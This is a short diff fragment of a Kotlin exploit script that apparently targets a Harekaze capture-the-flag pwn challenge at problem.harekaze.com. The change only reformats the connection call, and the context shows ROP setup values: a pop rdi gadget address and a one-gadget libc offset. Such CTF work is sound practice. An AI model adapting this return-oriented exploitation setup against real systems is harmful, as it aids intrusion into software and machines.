@@ -5,7 +5,7 @@ import java.nio.charset.*
 import java.net.Socket
 import java.nio.*
 fun main(args : Array<String>){
-	val p = Remote("problem.harekaze.com",20005)
+	val p = Remote("problem.harekaze.com", 20005)
 	println(p.recv().toString(p.charset))
 	val pop_rdi_ret= 0x00400733
 	val onerce = 0x4526a
